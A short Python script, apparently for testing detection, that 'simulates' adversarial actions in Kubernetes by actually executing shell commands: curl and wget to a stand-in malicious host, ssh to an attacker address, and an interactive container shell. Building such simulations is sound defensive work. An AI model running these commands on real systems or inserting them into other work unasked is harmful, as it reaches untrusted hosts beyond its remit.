import subprocess
import logging


def run_adversary_actions():
    """Simulates common adversarial actions in a Kubernetes environment."""
    commands = [
        "curl http://malicious-site.com",
        "wget http://malicious-site.com/file",
        "ssh attacker@remote-ip",
        "docker run --rm -it alpine sh",
    ]

    logging.info("Starting adversarial action simulation...")

    for cmd in commands:
        try:
            subprocess.run(cmd, shell=True, check=True)
            logging.info(f"Executed: {cmd}")
        except subprocess.CalledProcessError as e:
            logging.error(f"Command failed: {cmd}, Error: {e}")

    logging.info("Simulation complete.")
